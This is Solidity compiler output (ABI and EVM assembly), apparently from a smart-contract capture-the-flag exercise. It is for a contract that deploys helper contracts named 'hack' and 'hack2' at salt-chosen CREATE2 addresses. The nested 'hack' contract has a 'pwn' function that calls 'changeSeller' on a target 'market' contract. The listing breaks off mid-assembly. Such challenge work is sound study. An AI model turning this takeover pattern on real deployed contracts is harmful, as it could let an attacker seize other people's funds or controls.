{
	"shoot/摸底1/3/1.sol": {
		"deployed": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "bytes32",
							"name": "salt",
							"type": "bytes32"
						}
					],
					"name": "deploy1",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "bytes32",
							"name": "salt",
							"type": "bytes32"
						}
					],
					"name": "deploy2",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "exchangeSellerBytesHash",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "a",
							"type": "bytes32"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "get",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						},
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "ha",
					"outputs": [
						{
							"internalType": "contract hack",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "ha2",
					"outputs": [
						{
							"internalType": "contract hack2",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2986:3625  contract deployed {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2986:3625  contract deployed {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x0a504439\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x0fa4b410\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x6d4ce63c\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xb90365a7\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xdec3c14f\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xdffd9b23\n      eq\n      tag_8\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3011:3025  hack public ha */\n    tag_3:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3213:3343  function deploy1(bytes32 salt) public returns(address) {... */\n    tag_4:\n      tag_13\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      tag_16\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      tag_17\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3055:3207  function get() public view returns(bytes32, bytes32) {... */\n    tag_5:\n      tag_19\n      tag_20\n      jump\t// in\n    tag_19:\n      mload(0x40)\n      tag_21\n      swap3\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3349:3481  function exchangeSellerBytesHash() public view returns(bytes32 a){... */\n    tag_6:\n      tag_23\n      tag_24\n      jump\t// in\n    tag_23:\n      mload(0x40)\n      tag_25\n      swap2\n      swap1\n      tag_26\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3489:3622  function deploy2(bytes32 salt) public returns(address) {... */\n    tag_7:\n      tag_27\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_28\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_28:\n      tag_29\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      tag_30\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_30:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3032:3048  hack2 public ha2 */\n    tag_8:\n      tag_31\n      tag_32\n      jump\t// in\n    tag_31:\n      mload(0x40)\n      tag_33\n      swap2\n      swap1\n      tag_34\n      jump\t// in\n    tag_33:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3011:3025  hack public ha */\n    tag_10:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3213:3343  function deploy1(bytes32 salt) public returns(address) {... */\n    tag_16:\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3259:3266  address */\n      0x00\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3299:3303  salt */\n      dup2\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3284:3306  new hack{salt: salt}() */\n      mload(0x40)\n      tag_36\n      swap1\n      tag_37\n      jump\t// in\n    tag_36:\n      dup2\n      swap1\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      0x00\n      create2\n      swap1\n      pop\n      dup1\n      iszero\n      dup1\n      iszero\n      tag_38\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_38:\n      pop\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3279:3281  ha */\n      0x00\n      dup1\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3279:3306  ha = new hack{salt: salt}() */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3332:3334  ha */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3317:3335  return address(ha) */\n      swap1\n      pop\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3213:3343  function deploy1(bytes32 salt) public returns(address) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3055:3207  function get() public view returns(bytes32, bytes32) {... */\n    tag_20:\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3090:3097  bytes32 */\n      0x00\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3099:3106  bytes32 */\n      dup1\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3137:3160  type(hack).creationCode */\n      mload(0x40)\n      dup1\n      0x20\n      add\n      tag_40\n      swap1\n      tag_37\n      jump\t// in\n    tag_40:\n      0x20\n      dup3\n      add\n      dup2\n      sub\n      dup3\n      mstore\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      0x40\n      mstore\n      pop\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3127:3161  keccak256(type(hack).creationCode) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3173:3197  type(hack2).creationCode */\n      mload(0x40)\n      dup1\n      0x20\n      add\n      tag_41\n      swap1\n      tag_42\n      jump\t// in\n    tag_41:\n      0x20\n      dup3\n      add\n      dup2\n      sub\n      dup3\n      mstore\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      0x40\n      mstore\n      pop\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3163:3198  keccak256(type(hack2).creationCode) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3119:3199  return (keccak256(type(hack).creationCode), keccak256(type(hack2).creationCode)) */\n      swap2\n      pop\n      swap2\n      pop\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3055:3207  function get() public view returns(bytes32, bytes32) {... */\n      swap1\n      swap2\n      jump\t// out\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3349:3481  function exchangeSellerBytesHash() public view returns(bytes32 a){... */\n    tag_24:\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3404:3413  bytes32 a */\n      0x00\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3439:3472  type(exchangeseller).creationCode */\n      mload(0x40)\n      dup1\n      0x20\n      add\n      tag_44\n      swap1\n      tag_45\n      jump\t// in\n    tag_44:\n      0x20\n      dup3\n      add\n      dup2\n      sub\n      dup3\n      mstore\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      0x40\n      mstore\n      pop\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3429:3473  keccak256(type(exchangeseller).creationCode) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3425:3473  a = keccak256(type(exchangeseller).creationCode) */\n      swap1\n      pop\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3349:3481  function exchangeSellerBytesHash() public view returns(bytes32 a){... */\n      swap1\n      jump\t// out\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3489:3622  function deploy2(bytes32 salt) public returns(address) {... */\n    tag_29:\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3535:3542  address */\n      0x00\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3577:3581  salt */\n      dup2\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3561:3584  new hack2{salt: salt}() */\n      mload(0x40)\n      tag_47\n      swap1\n      tag_42\n      jump\t// in\n    tag_47:\n      dup2\n      swap1\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      0x00\n      create2\n      swap1\n      pop\n      dup1\n      iszero\n      dup1\n      iszero\n      tag_48\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_48:\n      pop\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3555:3558  ha2 */\n      0x01\n      0x00\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3555:3584  ha2 = new hack2{salt: salt}() */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3610:3613  ha2 */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3595:3614  return address(ha2) */\n      swap1\n      pop\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3489:3622  function deploy2(bytes32 salt) public returns(address) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":3032:3048  hack2 public ha2 */\n    tag_32:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n    tag_37:\n      dataSize(sub_0)\n      dup1\n      dataOffset(sub_0)\n      dup4\n      codecopy\n      add\n      swap1\n      jump\t// out\n    tag_42:\n      dataSize(sub_1)\n      dup1\n      dataOffset(sub_1)\n      dup4\n      codecopy\n      add\n      swap1\n      jump\t// out\n    tag_45:\n      dataSize(sub_2)\n      dup1\n      dataOffset(sub_2)\n      dup4\n      codecopy\n      add\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_49:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:199   */\n    tag_50:\n        /* \"#utility.yul\":167:170   */\n      0x00\n        /* \"#utility.yul\":188:193   */\n      dup2\n        /* \"#utility.yul\":181:193   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":205:347   */\n    tag_51:\n        /* \"#utility.yul\":255:264   */\n      0x00\n        /* \"#utility.yul\":288:341   */\n      tag_70\n        /* \"#utility.yul\":306:340   */\n      tag_71\n        /* \"#utility.yul\":315:339   */\n      tag_72\n        /* \"#utility.yul\":333:338   */\n      dup5\n        /* \"#utility.yul\":315:339   */\n      tag_49\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":306:340   */\n      tag_50\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":288:341   */\n      tag_49\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":275:341   */\n      swap1\n      pop\n        /* \"#utility.yul\":205:347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":353:479   */\n    tag_52:\n        /* \"#utility.yul\":403:412   */\n      0x00\n        /* \"#utility.yul\":436:473   */\n      tag_74\n        /* \"#utility.yul\":467:472   */\n      dup3\n        /* \"#utility.yul\":436:473   */\n      tag_51\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":423:473   */\n      swap1\n      pop\n        /* \"#utility.yul\":353:479   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":485:623   */\n    tag_53:\n        /* \"#utility.yul\":547:556   */\n      0x00\n        /* \"#utility.yul\":580:617   */\n      tag_76\n        /* \"#utility.yul\":611:616   */\n      dup3\n        /* \"#utility.yul\":580:617   */\n      tag_52\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":567:617   */\n      swap1\n      pop\n        /* \"#utility.yul\":485:623   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":629:784   */\n    tag_54:\n        /* \"#utility.yul\":728:777   */\n      tag_78\n        /* \"#utility.yul\":771:776   */\n      dup2\n        /* \"#utility.yul\":728:777   */\n      tag_53\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":723:726   */\n      dup3\n        /* \"#utility.yul\":716:778   */\n      mstore\n        /* \"#utility.yul\":629:784   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":790:1036   */\n    tag_12:\n        /* \"#utility.yul\":895:899   */\n      0x00\n        /* \"#utility.yul\":933:935   */\n      0x20\n        /* \"#utility.yul\":922:931   */\n      dup3\n        /* \"#utility.yul\":918:936   */\n      add\n        /* \"#utility.yul\":910:936   */\n      swap1\n      pop\n        /* \"#utility.yul\":946:1029   */\n      tag_80\n        /* \"#utility.yul\":1026:1027   */\n      0x00\n        /* \"#utility.yul\":1015:1024   */\n      dup4\n        /* \"#utility.yul\":1011:1028   */\n      add\n        /* \"#utility.yul\":1002:1008   */\n      dup5\n        /* \"#utility.yul\":946:1029   */\n      tag_54\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":790:1036   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1123:1240   */\n    tag_56:\n        /* \"#utility.yul\":1232:1233   */\n      0x00\n        /* \"#utility.yul\":1229:1230   */\n      dup1\n        /* \"#utility.yul\":1222:1234   */\n      revert\n        /* \"#utility.yul\":1369:1446   */\n    tag_58:\n        /* \"#utility.yul\":1406:1413   */\n      0x00\n        /* \"#utility.yul\":1435:1440   */\n      dup2\n        /* \"#utility.yul\":1424:1440   */\n      swap1\n      pop\n        /* \"#utility.yul\":1369:1446   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1452:1574   */\n    tag_59:\n        /* \"#utility.yul\":1525:1549   */\n      tag_86\n        /* \"#utility.yul\":1543:1548   */\n      dup2\n        /* \"#utility.yul\":1525:1549   */\n      tag_58\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":1518:1523   */\n      dup2\n        /* \"#utility.yul\":1515:1550   */\n      eq\n        /* \"#utility.yul\":1505:1568   */\n      tag_87\n      jumpi\n        /* \"#utility.yul\":1564:1565   */\n      0x00\n        /* \"#utility.yul\":1561:1562   */\n      dup1\n        /* \"#utility.yul\":1554:1566   */\n      revert\n        /* \"#utility.yul\":1505:1568   */\n    tag_87:\n        /* \"#utility.yul\":1452:1574   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1580:1719   */\n    tag_60:\n        /* \"#utility.yul\":1626:1631   */\n      0x00\n        /* \"#utility.yul\":1664:1670   */\n      dup2\n        /* \"#utility.yul\":1651:1671   */\n      calldataload\n        /* \"#utility.yul\":1642:1671   */\n      swap1\n      pop\n        /* \"#utility.yul\":1680:1713   */\n      tag_89\n        /* \"#utility.yul\":1707:1712   */\n      dup2\n        /* \"#utility.yul\":1680:1713   */\n      tag_59\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":1580:1719   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1725:2054   */\n    tag_15:\n        /* \"#utility.yul\":1784:1790   */\n      0x00\n        /* \"#utility.yul\":1833:1835   */\n      0x20\n        /* \"#utility.yul\":1821:1830   */\n      dup3\n        /* \"#utility.yul\":1812:1819   */\n      dup5\n        /* \"#utility.yul\":1808:1831   */\n      sub\n        /* \"#utility.yul\":1804:1836   */\n      slt\n        /* \"#utility.yul\":1801:1920   */\n      iszero\n      tag_91\n      jumpi\n        /* \"#utility.yul\":1839:1918   */\n      tag_92\n      tag_56\n      jump\t// in\n    tag_92:\n        /* \"#utility.yul\":1801:1920   */\n    tag_91:\n        /* \"#utility.yul\":1959:1960   */\n      0x00\n        /* \"#utility.yul\":1984:2037   */\n      tag_93\n        /* \"#utility.yul\":2029:2036   */\n      dup5\n        /* \"#utility.yul\":2020:2026   */\n      dup3\n        /* \"#utility.yul\":2009:2018   */\n      dup6\n        /* \"#utility.yul\":2005:2027   */\n      add\n        /* \"#utility.yul\":1984:2037   */\n      tag_60\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":1974:2037   */\n      swap2\n      pop\n        /* \"#utility.yul\":1930:2047   */\n      pop\n        /* \"#utility.yul\":1725:2054   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2060:2156   */\n    tag_61:\n        /* \"#utility.yul\":2097:2104   */\n      0x00\n        /* \"#utility.yul\":2126:2150   */\n      tag_95\n        /* \"#utility.yul\":2144:2149   */\n      dup3\n        /* \"#utility.yul\":2126:2150   */\n      tag_49\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":2115:2150   */\n      swap1\n      pop\n        /* \"#utility.yul\":2060:2156   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2162:2280   */\n    tag_62:\n        /* \"#utility.yul\":2249:2273   */\n      tag_97\n        /* \"#utility.yul\":2267:2272   */\n      dup2\n        /* \"#utility.yul\":2249:2273   */\n      tag_61\n      jump\t// in\n    tag_97:\n        /* \"#utility.yul\":2244:2247   */\n      dup3\n        /* \"#utility.yul\":2237:2274   */\n      mstore\n        /* \"#utility.yul\":2162:2280   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2286:2508   */\n    tag_18:\n        /* \"#utility.yul\":2379:2383   */\n      0x00\n        /* \"#utility.yul\":2417:2419   */\n      0x20\n        /* \"#utility.yul\":2406:2415   */\n      dup3\n        /* \"#utility.yul\":2402:2420   */\n      add\n        /* \"#utility.yul\":2394:2420   */\n      swap1\n      pop\n        /* \"#utility.yul\":2430:2501   */\n      tag_99\n        /* \"#utility.yul\":2498:2499   */\n      0x00\n        /* \"#utility.yul\":2487:2496   */\n      dup4\n        /* \"#utility.yul\":2483:2500   */\n      add\n        /* \"#utility.yul\":2474:2480   */\n      dup5\n        /* \"#utility.yul\":2430:2501   */\n      tag_62\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":2286:2508   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2514:2632   */\n    tag_63:\n        /* \"#utility.yul\":2601:2625   */\n      tag_101\n        /* \"#utility.yul\":2619:2624   */\n      dup2\n        /* \"#utility.yul\":2601:2625   */\n      tag_58\n      jump\t// in\n    tag_101:\n        /* \"#utility.yul\":2596:2599   */\n      dup3\n        /* \"#utility.yul\":2589:2626   */\n      mstore\n        /* \"#utility.yul\":2514:2632   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2638:2970   */\n    tag_22:\n        /* \"#utility.yul\":2759:2763   */\n      0x00\n        /* \"#utility.yul\":2797:2799   */\n      0x40\n        /* \"#utility.yul\":2786:2795   */\n      dup3\n        /* \"#utility.yul\":2782:2800   */\n      add\n        /* \"#utility.yul\":2774:2800   */\n      swap1\n      pop\n        /* \"#utility.yul\":2810:2881   */\n      tag_103\n        /* \"#utility.yul\":2878:2879   */\n      0x00\n        /* \"#utility.yul\":2867:2876   */\n      dup4\n        /* \"#utility.yul\":2863:2880   */\n      add\n        /* \"#utility.yul\":2854:2860   */\n      dup6\n        /* \"#utility.yul\":2810:2881   */\n      tag_63\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":2891:2963   */\n      tag_104\n        /* \"#utility.yul\":2959:2961   */\n      0x20\n        /* \"#utility.yul\":2948:2957   */\n      dup4\n        /* \"#utility.yul\":2944:2962   */\n      add\n        /* \"#utility.yul\":2935:2941   */\n      dup5\n        /* \"#utility.yul\":2891:2963   */\n      tag_63\n      jump\t// in\n    tag_104:\n        /* \"#utility.yul\":2638:2970   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2976:3198   */\n    tag_26:\n        /* \"#utility.yul\":3069:3073   */\n      0x00\n        /* \"#utility.yul\":3107:3109   */\n      0x20\n        /* \"#utility.yul\":3096:3105   */\n      dup3\n        /* \"#utility.yul\":3092:3110   */\n      add\n        /* \"#utility.yul\":3084:3110   */\n      swap1\n      pop\n        /* \"#utility.yul\":3120:3191   */\n      tag_106\n        /* \"#utility.yul\":3188:3189   */\n      0x00\n        /* \"#utility.yul\":3177:3186   */\n      dup4\n        /* \"#utility.yul\":3173:3190   */\n      add\n        /* \"#utility.yul\":3164:3170   */\n      dup5\n        /* \"#utility.yul\":3120:3191   */\n      tag_63\n      jump\t// in\n    tag_106:\n        /* \"#utility.yul\":2976:3198   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3204:3343   */\n    tag_64:\n        /* \"#utility.yul\":3267:3276   */\n      0x00\n        /* \"#utility.yul\":3300:3337   */\n      tag_108\n        /* \"#utility.yul\":3331:3336   */\n      dup3\n        /* \"#utility.yul\":3300:3337   */\n      tag_52\n      jump\t// in\n    tag_108:\n        /* \"#utility.yul\":3287:3337   */\n      swap1\n      pop\n        /* \"#utility.yul\":3204:3343   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3349:3506   */\n    tag_65:\n        /* \"#utility.yul\":3449:3499   */\n      tag_110\n        /* \"#utility.yul\":3493:3498   */\n      dup2\n        /* \"#utility.yul\":3449:3499   */\n      tag_64\n      jump\t// in\n    tag_110:\n        /* \"#utility.yul\":3444:3447   */\n      dup3\n        /* \"#utility.yul\":3437:3500   */\n      mstore\n        /* \"#utility.yul\":3349:3506   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3512:3760   */\n    tag_34:\n        /* \"#utility.yul\":3618:3622   */\n      0x00\n        /* \"#utility.yul\":3656:3658   */\n      0x20\n        /* \"#utility.yul\":3645:3654   */\n      dup3\n        /* \"#utility.yul\":3641:3659   */\n      add\n        /* \"#utility.yul\":3633:3659   */\n      swap1\n      pop\n        /* \"#utility.yul\":3669:3753   */\n      tag_112\n        /* \"#utility.yul\":3750:3751   */\n      0x00\n        /* \"#utility.yul\":3739:3748   */\n      dup4\n        /* \"#utility.yul\":3735:3752   */\n      add\n        /* \"#utility.yul\":3726:3732   */\n      dup5\n        /* \"#utility.yul\":3669:3753   */\n      tag_65\n      jump\t// in\n    tag_112:\n        /* \"#utility.yul\":3512:3760   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n    stop\n\n    sub_0: assembly {\n            /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2680:2849  contract hack {... */\n          mstore(0x40, 0x80)\n          callvalue\n          dup1\n          iszero\n          tag_1\n          jumpi\n          0x00\n          dup1\n          revert\n        tag_1:\n          pop\n          dataSize(sub_0)\n          dup1\n          dataOffset(sub_0)\n          0x00\n          codecopy\n          0x00\n          return\n        stop\n\n        sub_0: assembly {\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2680:2849  contract hack {... */\n              mstore(0x40, 0x80)\n              callvalue\n              dup1\n              iszero\n              tag_1\n              jumpi\n              0x00\n              dup1\n              revert\n            tag_1:\n              pop\n              jumpi(tag_2, lt(calldatasize, 0x04))\n              shr(0xe0, calldataload(0x00))\n              dup1\n              0x02c6591d\n              eq\n              tag_3\n              jumpi\n            tag_2:\n              0x00\n              dup1\n              revert\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2701:2846  function pwn(market mar) public returns(uint128){... */\n            tag_3:\n              tag_4\n              0x04\n              dup1\n              calldatasize\n              sub\n              dup2\n              add\n              swap1\n              tag_5\n              swap2\n              swap1\n              tag_6\n              jump\t// in\n            tag_5:\n              tag_7\n              jump\t// in\n            tag_4:\n              mload(0x40)\n              tag_8\n              swap2\n              swap1\n              tag_9\n              jump\t// in\n            tag_8:\n              mload(0x40)\n              dup1\n              swap2\n              sub\n              swap1\n              return\n            tag_7:\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2741:2748  uint128 */\n              0x00\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2760:2763  mar */\n              dup2\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2760:2776  mar.changeSeller */\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              0xe90e2fed\n                /* \"shoot/\\xe6\\x91\\xb8\\xe5\\xba\\x951/3/1.sol\":2760:2778  mar.changeSeller() */\n              mload(0x40)\n              dup2\n              0xffffffff\n              and\n              0xe0\n              shl\n              dup2\n              mstore\n              0x04\n              add\n              0x00\n              mload(0x40)\n              dup1\n              dup4\n              sub\n              dup2\n              0x00\n              dup8\n              dup1\n              extcodesize\n              iszero\n              dup1\n              iszero\n              tag_11\n              jumpi\n              0x00\n              dup1\n              revert\n            tag_11:\n              pop\n              gas\n              call\n              iszero\n              dup1\n              iszero\n              tag_13\n              jumpi\n              returndatasize\n              0x00\n              dup1\n              returndatacopy\n              revert(0x00, returndatasize)\n            tag_13:\n              pop\n              pop\n              pop\n              pop\n                /* 